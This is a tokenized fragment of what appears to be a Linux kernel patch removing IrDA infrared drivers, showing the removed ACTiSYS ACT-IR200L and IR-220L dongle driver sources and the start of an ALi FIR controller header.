"-", "$(", "CONFIG_PXA_FICP", ")", "+", "=", "pxaficp_ir", ".", "o", "obj", "-", "$(", "CONFIG_MCS_FIR", ")", "+", "=", "mcs7780", ".", "o", "obj", "-", "$(", "CONFIG_AU1000_FIR", ")", "+", "=", "au1k_ir", ".", "o", "#", "SIR", "drivers", "obj", "-", "$(", "CONFIG_IRTTY_SIR", ")", "+", "=", "irtty", "-", "sir", ".", "o", "sir", "-", "dev", ".", "o", "obj", "-", "$(", "CONFIG_BFIN_SIR", ")", "+", "=", "bfin_sir", ".", "o", "obj", "-", "$(", "CONFIG_SH_SIR", ")", "+", "=", "sh_sir", ".", "o", "#", "dongle", "drivers", "for", "SIR", "drivers", "obj", "-", "$(", "CONFIG_ESI_DONGLE", ")", "+", "=", "esi", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_TEKRAM_DONGLE", ")", "+", "=", "tekram", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_ACTISYS_DONGLE", ")", "+", "=", "actisys", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_LITELINK_DONGLE", ")", "+", "=", "litelink", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_GIRBIL_DONGLE", ")", "+", "=", "girbil", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_OLD_BELKIN_DONGLE", ")", "+", "=", "old_belkin", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_MCP2120_DONGLE", ")", "+", "=", "mcp2120", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_ACT200L_DONGLE", ")", "+", "=", "act200l", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_MA600_DONGLE", ")", "+", "=", "ma600", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_TOIM3232_DONGLE", ")", "+", "=", "toim3232", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_KINGSUN_DONGLE", ")", "+", "=", "kingsun", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_KSDAZZLE_DONGLE", ")", "+", "=", "ksdazzle", "-", "sir", ".", "o", "obj", "-", "$(", "CONFIG_KS959_DONGLE", ")", "+", "=", "ks959", "-", "sir", ".", "o", "#", "The", "SIR", "helper", "module", "sir", "-", "dev", "-", "objs", ":", "=", "sir_dev", ".", "o", "sir_dongle", ".", "o", "@", "@", "-", "1", ",", "250", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "act200l", ".", "c", "*", "Version", ":", "0", ".", "8", "*", "Description", ":", "Implementation", "for", "the", "ACTiSYS", "ACT", "-", "IR200L", "dongle", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "SHIMIZU", "Takuya", "<", "tshimizu", "@", "ga2", ".", "so", "-", "net", ".", "ne", ".", "jp", ">", "*", "Created", "at", ":", "Fri", "Aug", "3", "17", ":", "35", ":", "42", "2001", "*", "Modified", "at", ":", "Fri", "Aug", "17", "10", ":", "22", ":", "40", "2001", "*", "Modified", "by", ":", "SHIMIZU", "Takuya", "<", "tshimizu", "@", "ga2", ".", "so", "-", "net", ".", "ne", ".", "jp", ">", "*", "*", "Copyright", "(", "c", ")", "2001", "SHIMIZU", "Takuya", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "static", "int", "act200l_reset", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "act200l_open", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "act200l_close", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "act200l_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", ";", "/", "*", "Regsiter", "0", ":", "Control", "register", "#", "1", "*", "/", "#", "define", "ACT200L_REG0", "0x00", "#", "define", "ACT200L_TXEN", "0x01", "/", "*", "Enable", "transmitter", "*", "/", "#", "define", "ACT200L_RXEN", "0x02", "/", "*", "Enable", "receiver", "*", "/", "/", "*", "Register", "1", ":", "Control", "register", "#", "2", "*", "/", "#", "define", "ACT200L_REG1", "0x10", "#", "define", "ACT200L_LODB", "0x01", "/", "*", "Load", "new", "baud", "rate", "count", "value", "*", "/", "#", "define", "ACT200L_WIDE", "0x04", "/", "*", "Expand", "the", "maximum", "allowable", "pulse", "*", "/", "/", "*", "Register", "4", ":", "Output", "Power", "register", "*", "/", "#", "define", "ACT200L_REG4", "0x40", "#", "define", "ACT200L_OP0", "0x01", "/", "*", "Enable", "LED1C", "output", "*", "/", "#", "define", "ACT200L_OP1", "0x02", "/", "*", "Enable", "LED2C", "output", "*", "/", "#", "define", "ACT200L_BLKR", "0x04", "/", "*", "Register", "5", ":", "Receive", "Mode", "register", "*", "/", "#", "define", "ACT200L_REG5", "0x50", "#", "define", "ACT200L_RWIDL", "0x01", "/", "*", "fixed", "1", ".", "6us", "pulse", "mode", "*", "/", "/", "*", "Register", "6", ":", "Receive", "Sensitivity", "register", "#", "1", "*", "/", "#", "define", "ACT200L_REG6", "0x60", "#", "define", "ACT200L_RS0", "0x01", "/", "*", "receive", "threshold", "bit", "0", "*", "/", "#", "define", "ACT200L_RS1", "0x02", "/", "*", "receive", "threshold", "bit", "1", "*", "/", "/", "*", "Register", "7", ":", "Receive", "Sensitivity", "register", "#", "2", "*", "/", "#", "define", "ACT200L_REG7", "0x70", "#", "define", "ACT200L_ENPOS", "0x04", "/", "*", "Ignore", "the", "falling", "edge", "*", "/", "/", "*", "Register", "8", ",", "9", ":", "Baud", "Rate", "Dvider", "register", "#", "1", ",", "#", "2", "*", "/", "#", "define", "ACT200L_REG8", "0x80", "#", "define", "ACT200L_REG9", "0x90", "#", "define", "ACT200L_2400", "0x5f", "#", "define", "ACT200L_9600", "0x17", "#", "define", "ACT200L_19200", "0x0b", "#", "define", "ACT200L_38400", "0x05", "#", "define", "ACT200L_57600", "0x03", "#", "define", "ACT200L_115200", "0x01", "/", "*", "Register", "13", ":", "Control", "register", "#", "3", "*", "/", "#", "define", "ACT200L_REG13", "0xd0", "#", "define", "ACT200L_SHDW", "0x01", "/", "*", "Enable", "access", "to", "shadow", "registers", "*", "/", "/", "*", "Register", "15", ":", "Status", "register", "*", "/", "#", "define", "ACT200L_REG15", "0xf0", "/", "*", "Register", "21", ":", "Control", "register", "#", "4", "*", "/", "#", "define", "ACT200L_REG21", "0x50", "#", "define", "ACT200L_EXCK", "0x02", "/", "*", "Disable", "clock", "output", "driver", "*", "/", "#", "define", "ACT200L_OSCL", "0x04", "/", "*", "oscillator", "in", "low", "power", ",", "medium", "accuracy", "mode", "*", "/", "static", "struct", "dongle_driver", "act200l", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "ACTiSYS", "ACT", "-", "IR200L", "\"", ",", ".", "type", "=", "IRDA_ACT200L_DONGLE", ",", ".", "open", "=", "act200l_open", ",", ".", "close", "=", "act200l_close", ",", ".", "reset", "=", "act200l_reset", ",", ".", "set_speed", "=", "act200l_change_speed", ",", "}", ";", "static", "int", "__init", "act200l_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "act200l", ")", ";", "}", "static", "void", "__exit", "act200l_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "act200l", ")", ";", "}", "static", "int", "act200l_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "Power", "on", "the", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Set", "the", "speeds", "we", "can", "accept", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x03", ";", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "act200l_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "the", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "act200l_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Set", "the", "speed", "for", "the", "ACTiSYS", "ACT", "-", "IR200L", "type", "dongle", ".", "*", "*", "/", "static", "int", "act200l_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "u8", "control", "[", "3", "]", ";", "int", "ret", "=", "0", ";", "/", "*", "Clear", "DTR", "and", "set", "RTS", "to", "enter", "command", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "switch", "(", "speed", ")", "{", "default", ":", "ret", "=", "-", "EINVAL", ";", "/", "*", "fall", "through", "*", "/", "case", "9600", ":", "control", "[", "0", "]", "=", "ACT200L_REG8", "|", "(", "ACT200L_9600", "&", "0x0f", ")", ";", "control", "[", "1", "]", "=", "ACT200L_REG9", "|", "(", "(", "ACT200L_9600", ">", ">", "4", ")", "&", "0x0f", ")", ";", "break", ";", "case", "19200", ":", "control", "[", "0", "]", "=", "ACT200L_REG8", "|", "(", "ACT200L_19200", "&", "0x0f", ")", ";", "control", "[", "1", "]", "=", "ACT200L_REG9", "|", "(", "(", "ACT200L_19200", ">", ">", "4", ")", "&", "0x0f", ")", ";", "break", ";", "case", "38400", ":", "control", "[", "0", "]", "=", "ACT200L_REG8", "|", "(", "ACT200L_38400", "&", "0x0f", ")", ";", "control", "[", "1", "]", "=", "ACT200L_REG9", "|", "(", "(", "ACT200L_38400", ">", ">", "4", ")", "&", "0x0f", ")", ";", "break", ";", "case", "57600", ":", "control", "[", "0", "]", "=", "ACT200L_REG8", "|", "(", "ACT200L_57600", "&", "0x0f", ")", ";", "control", "[", "1", "]", "=", "ACT200L_REG9", "|", "(", "(", "ACT200L_57600", ">", ">", "4", ")", "&", "0x0f", ")", ";", "break", ";", "case", "115200", ":", "control", "[", "0", "]", "=", "ACT200L_REG8", "|", "(", "ACT200L_115200", "&", "0x0f", ")", ";", "control", "[", "1", "]", "=", "ACT200L_REG9", "|", "(", "(", "ACT200L_115200", ">", ">", "4", ")", "&", "0x0f", ")", ";", "break", ";", "}", "control", "[", "2", "]", "=", "ACT200L_REG1", "|", "ACT200L_LODB", "|", "ACT200L_WIDE", ";", "/", "*", "Write", "control", "bytes", "*", "/", "sirdev_raw_write", "(", "dev", ",", "control", ",", "3", ")", ";", "msleep", "(", "5", ")", ";", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "dev", "-", ">", "speed", "=", "speed", ";", "return", "ret", ";", "}", "/", "*", "*", "Function", "act200l_reset", "(", "driver", ")", "*", "*", "Reset", "the", "ACTiSYS", "ACT", "-", "IR200L", "type", "dongle", ".", "*", "/", "#", "define", "ACT200L_STATE_WAIT1_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "1", ")", "#", "define", "ACT200L_STATE_WAIT2_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "2", ")", "static", "int", "act200l_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "unsigned", "state", "=", "dev", "-", ">", "fsm", ".", "substate", ";", "unsigned", "delay", "=", "0", ";", "static", "const", "u8", "control", "[", "9", "]", "=", "{", "ACT200L_REG15", ",", "ACT200L_REG13", "|", "ACT200L_SHDW", ",", "ACT200L_REG21", "|", "ACT200L_EXCK", "|", "ACT200L_OSCL", ",", "ACT200L_REG13", ",", "ACT200L_REG7", "|", "ACT200L_ENPOS", ",", "ACT200L_REG6", "|", "ACT200L_RS0", "|", "ACT200L_RS1", ",", "ACT200L_REG5", "|", "ACT200L_RWIDL", ",", "ACT200L_REG4", "|", "ACT200L_OP0", "|", "ACT200L_OP1", "|", "ACT200L_BLKR", ",", "ACT200L_REG0", "|", "ACT200L_TXEN", "|", "ACT200L_RXEN", "}", ";", "int", "ret", "=", "0", ";", "switch", "(", "state", ")", "{", "case", "SIRDEV_STATE_DONGLE_RESET", ":", "/", "*", "Reset", "the", "dongle", ":", "set", "RTS", "low", "for", "25", "ms", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "state", "=", "ACT200L_STATE_WAIT1_RESET", ";", "delay", "=", "50", ";", "break", ";", "case", "ACT200L_STATE_WAIT1_RESET", ":", "/", "*", "Clear", "DTR", "and", "set", "RTS", "to", "enter", "command", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "udelay", "(", "25", ")", ";", "/", "*", "better", "wait", "for", "some", "short", "while", "*", "/", "/", "*", "Write", "control", "bytes", "*", "/", "sirdev_raw_write", "(", "dev", ",", "control", ",", "sizeof", "(", "control", ")", ");", "state", "=", "ACT200L_STATE_WAIT2_RESET", ";", "delay", "=", "15", ";", "break", ";", "case", "ACT200L_STATE_WAIT2_RESET", ":", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "dev", "-", ">", "speed", "=", "9600", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "unknown", "state", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "state", ")", ";", "ret", "=", "-", "1", ";", "break", ";", "}", "dev", "-", ">", "fsm", ".", "substate", "=", "state", ";", "return", "(", "delay", ">", "0", ")", "?", "delay", ":", "ret", ";", "}", "MODULE_AUTHOR", "(", "\"", "SHIMIZU", "Takuya", "<", "tshimizu", "@", "ga2", ".", "so", "-", "net", ".", "ne", ".", "jp", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "ACTiSYS", "ACT", "-", "IR200L", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "10", "\"", ");", "/", "*", "IRDA_ACT200L_DONGLE", "*", "/", "module_init", "(", "act200l_sir_init", ")", ";", "module_exit", "(", "act200l_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "245", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "actisys", ".", "c", "*", "Version", ":", "1", ".", "1", "*", "Description", ":", "Implementation", "for", "the", "ACTiSYS", "IR", "-", "220L", "and", "IR", "-", "220L", "+", "*", "dongles", "*", "Status", ":", "Beta", ".", "*", "Authors", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "(", "initially", ")", "*", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "(", "new", "version", ")", "*", "Martin", "Diehl", "<", "mad", "@", "mdiehl", ".", "de", ">", "(", "new", "version", "for", "sir_dev", ")", "*", "Created", "at", ":", "Wed", "Oct", "21", "20", ":", "02", ":", "35", "1998", "*", "Modified", "at", ":", "Sun", "Oct", "27", "22", ":", "02", ":", "13", "2002", "*", "Modified", "by", ":", "Martin", "Diehl", "<", "mad", "@", "mdiehl", ".", "de", ">", "*", "*", "Copyright", "(", "c", ")", "1998", "-", "1999", "Dag", "Brattli", ",", "All", "Rights", "Reserved", ".", "*", "Copyright", "(", "c", ")", "1999", "Jean", "Tourrilhes", "*", "Copyright", "(", "c", ")", "2002", "Martin", "Diehl", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "Dag", "Brattli", "nor", "University", "of", "Troms", "\u00f8", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "*", "Changelog", "*", "*", "0", ".", "8", "-", ">", "0", ".", "9999", "-", "Jean", "*", "o", "New", "initialisation", "procedure", ":", "much", "safer", "and", "correct", "*", "o", "New", "procedure", "the", "change", "speed", ":", "much", "faster", "and", "simpler", "*", "o", "Other", "cleanups", "&", "comments", "*", "Thanks", "to", "Lichen", "Wang", "@", "Actisys", "for", "his", "excellent", "help", ".", "..", "*", "*", "1", ".", "0", "-", ">", "1", ".", "1", "-", "Martin", "Diehl", "*", "modified", "for", "new", "sir", "infrastructure", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "/", "*", "*", "Define", "the", "timing", "of", "the", "pulses", "we", "send", "to", "the", "dongle", "(", "to", "reset", "it", ",", "and", "*", "to", "toggle", "speeds", ")", ".", "Basically", ",", "the", "limit", "here", "is", "the", "propagation", "speed", "of", "*", "the", "signals", "through", "the", "serial", "port", ",", "the", "dongle", "being", "much", "faster", ".", "Any", "*", "serial", "port", "support", "115", "kb", "/", "s", ",", "so", "we", "are", "sure", "that", "pulses", "8", ".", "5", "us", "wide", "can", "*", "go", "through", "cleanly", ".", "If", "you", "are", "on", "the", "wild", "side", ",", "you", "can", "try", "to", "lower", "*", "this", "value", "(", "Actisys", "recommended", "me", "2", "us", ",", "and", "0", "us", "work", "for", "me", "on", "a", "P233", "!", ")", "*", "/", "#", "define", "MIN_DELAY", "10", "/", "*", "10", "us", "to", "be", "on", "the", "conservative", "side", "*", "/", "static", "int", "actisys_open", "(", "struct", "sir_dev", "*", ");", "static", "int", "actisys_close", "(", "struct", "sir_dev", "*", ");", "static", "int", "actisys_change_speed", "(", "struct", "sir_dev", "*", ",", "unsigned", ")", ";", "static", "int", "actisys_reset", "(", "struct", "sir_dev", "*", ");", "/", "*", "These", "are", "the", "baudrates", "supported", ",", "in", "the", "order", "available", "*", "/", "/", "*", "Note", ":", "the", "220L", "doesn", "'", "t", "support", "38400", ",", "but", "we", "will", "fix", "that", "below", "*", "/", "static", "unsigned", "baud_rates", "[", "]", "=", "{", "9600", ",", "19200", ",", "57600", ",", "115200", ",", "38400", "}", ";", "#", "define", "MAX_SPEEDS", "ARRAY_SIZE", "(", "baud_rates", ")", "static", "struct", "dongle_driver", "act220l", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Actisys", "ACT", "-", "220L", "\"", ",", ".", "type", "=", "IRDA_ACTISYS_DONGLE", ",", ".", "open", "=", "actisys_open", ",", ".", "close", "=", "actisys_close", ",", ".", "reset", "=", "actisys_reset", ",", ".", "set_speed", "=", "actisys_change_speed", ",", "}", ";", "static", "struct", "dongle_driver", "act220l_plus", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Actisys", "ACT", "-", "220L", "+", "\",", ".", "type", "=", "IRDA_ACTISYS_PLUS_DONGLE", ",", ".", "open", "=", "actisys_open", ",", ".", "close", "=", "actisys_close", ",", ".", "reset", "=", "actisys_reset", ",", ".", "set_speed", "=", "actisys_change_speed", ",", "}", ";", "static", "int", "__init", "actisys_sir_init", "(", "void", ")", "{", "int", "ret", ";", "/", "*", "First", ",", "register", "an", "Actisys", "220L", "dongle", "*", "/", "ret", "=", "irda_register_dongle", "(", "&", "act220l", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "/", "*", "Now", ",", "register", "an", "Actisys", "220L", "+", "dongle", "*", "/", "ret", "=", "irda_register_dongle", "(", "&", "act220l_plus", ")", ";", "if", "(", "ret", "<", "0", ")", "{", "irda_unregister_dongle", "(", "&", "act220l", ")", ";", "return", "ret", ";", "}", "return", "0", ";", "}", "static", "void", "__exit", "actisys_sir_cleanup", "(", "void", ")", "{", "/", "*", "We", "have", "to", "remove", "both", "dongles", "*", "/", "irda_unregister_dongle", "(", "&", "act220l_plus", ")", ";", "irda_unregister_dongle", "(", "&", "act220l", ")", ";", "}", "static", "int", "actisys_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Set", "the", "speeds", "we", "can", "accept", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "/", "*", "Remove", "support", "for", "38400", "if", "this", "is", "not", "a", "220L", "+", "dongle", "*", "/", "if", "(", "dev", "-", ">", "dongle_drv", "-", ">", "type", "=", "=", "IRDA_ACTISYS_DONGLE", ")", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "~", "IR_38400", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x7f", ";", "/", "*", "Needs", "0", ".", "01", "ms", "*", "/", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "actisys_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "the", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "actisys_change_speed", "(", "task", ")", "*", "*", "Change", "speed", "of", "the", "ACTiSYS", "IR", "-", "220L", "and", "IR", "-", "220L", "+", "type", "IrDA", "dongles", ".", "*", "To", "cycle", "through", "the", "available", "baud", "rates", ",", "pulse", "RTS", "low", "for", "a", "few", "us", ".", "*", "*", "First", ",", "we", "reset", "the", "dongle", "to", "always", "start", "from", "a", "known", "state", ".", "*", "Then", ",", "we", "cycle", "through", "the", "speeds", "by", "pulsing", "RTS", "low", "and", "then", "up", ".", "*", "The", "dongle", "allow", "us", "to", "pulse", "quite", "fast", ",", "se", "we", "can", "set", "speed", "in", "one", "go", ",", "*", "which", "is", "must", "faster", "(", "<", "100", "us", ")", "and", "less", "complex", "than", "what", "is", "found", "*", "in", "some", "other", "dongle", "drivers", ".", "..", "*", "Note", "that", "even", "if", "the", "new", "speed", "is", "the", "same", "as", "the", "current", "speed", ",", "*", "we", "reassert", "the", "speed", ".", "This", "make", "sure", "that", "things", "are", "all", "right", ",", "*", "and", "it", "'", "s", "fast", "anyway", ".", "..", "*", "By", "the", "way", ",", "this", "function", "will", "work", "for", "both", "type", "of", "dongles", ",", "*", "because", "the", "additional", "speed", "is", "at", "the", "end", "of", "the", "sequence", ".", "..", "*", "/", "static", "int", "actisys_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "int", "ret", "=", "0", ";", "int", "i", "=", "0", ";", "pr_debug", "(", "\"%", "s", "(", "),", "speed", "=", "%", "d", "(", "was", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "speed", ",", "dev", "-", ">", "speed", ")", ";", "/", "*", "dongle", "was", "already", "resetted", "from", "irda_request", "state", "machine", ",", "*", "we", "are", "in", "known", "state", "(", "dongle", "default", ")", "*", "/", "/", "*", "*", "Now", ",", "we", "can", "set", "the", "speed", "requested", ".", "Send", "RTS", "pulses", "until", "we", "*", "reach", "the", "target", "speed", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "MAX_SPEEDS", ";", "i", "+", "+)", "{", "if", "(", "speed", "=", "=", "baud_rates", "[", "i", "]", ")", "{", "dev", "-", ">", "speed", "=", "speed", ";", "break", ";", "}", "/", "*", "Set", "RTS", "low", "for", "10", "us", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "Set", "RTS", "high", "for", "10", "us", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "udelay", "(", "MIN_DELAY", ")", ";", "}", "/", "*", "Check", "if", "life", "is", "sweet", ".", "..", "*", "/", "if", "(", "i", ">", "=", "MAX_SPEEDS", ")", "{", "actisys_reset", "(", "dev", ")", ";", "ret", "=", "-", "EINVAL", ";", "/", "*", "This", "should", "not", "happen", "*", "/", "}", "/", "*", "Basta", "lavoro", ",", "on", "se", "casse", "d", "'", "ici", ".", "..", "*", "/", "return", "ret", ";", "}", "/", "*", "*", "Function", "actisys_reset", "(", "task", ")", "*", "*", "Reset", "the", "Actisys", "type", "dongle", ".", "Warning", ",", "this", "function", "must", "only", "be", "*", "called", "with", "a", "process", "context", "!", "*", "*", "We", "need", "to", "do", "two", "things", "in", "this", "function", ":", "*", "o", "first", "make", "sure", "that", "the", "dongle", "is", "in", "a", "state", "where", "it", "can", "operate", "*", "o", "second", "put", "the", "dongle", "in", "a", "know", "state", "*", "*", "The", "dongle", "is", "powered", "of", "the", "RTS", "and", "DTR", "lines", ".", "In", "the", "dongle", ",", "there", "*", "is", "a", "big", "capacitor", "to", "accommodate", "the", "current", "spikes", ".", "This", "capacitor", "*", "takes", "a", "least", "50", "ms", "to", "be", "charged", ".", "In", "theory", ",", "the", "Bios", "set", "those", "lines", "*", "up", ",", "so", "by", "the", "time", "we", "arrive", "here", "we", "should", "be", "set", ".", "It", "doesn", "'", "t", "hurt", "*", "to", "be", "on", "the", "conservative", "side", ",", "so", "we", "will", "wait", ".", "..", "*", "<", "Martin", ":", "move", "above", "comment", "to", "irda_config_fsm", ">", "*", "Then", ",", "we", "set", "the", "speed", "to", "9600", "b", "/", "s", "to", "get", "in", "a", "known", "state", "(", "see", "in", "*", "change_speed", "for", "details", ")", ".", "It", "is", "needed", "because", "the", "IrDA", "stack", "*", "has", "tried", "to", "set", "the", "speed", "immediately", "after", "our", "first", "return", ",", "*", "so", "before", "we", "can", "be", "sure", "the", "dongle", "is", "up", "and", "running", ".", "*", "/", "static", "int", "actisys_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Reset", "the", "dongle", ":", "set", "DTR", "low", "for", "10", "us", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "dev", "-", ">", "speed", "=", "9600", ";", "/", "*", "That", "'", "s", "the", "default", "*", "/", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "-", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "ACTiSYS", "IR", "-", "220L", "and", "IR", "-", "220L", "+", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "2", "\"", ");", "/", "*", "IRDA_ACTISYS_DONGLE", "*", "/", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "3", "\"", ");", "/", "*", "IRDA_ACTISYS_PLUS_DONGLE", "*", "/", "module_init", "(", "actisys_sir_init", ")", ";", "module_exit", "(", "actisys_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "2217", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "ali", "-", "ircc", ".", "h", "*", "Version", ":", "0", ".", "5", "*", "Description", ":", "Driver", "for", "the", "ALI", "M1535D", "and", "M1543C", "FIR", "Controller", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Benjamin", "Kong", "<", "benjamin_kong", "@", "ali", ".", "com", 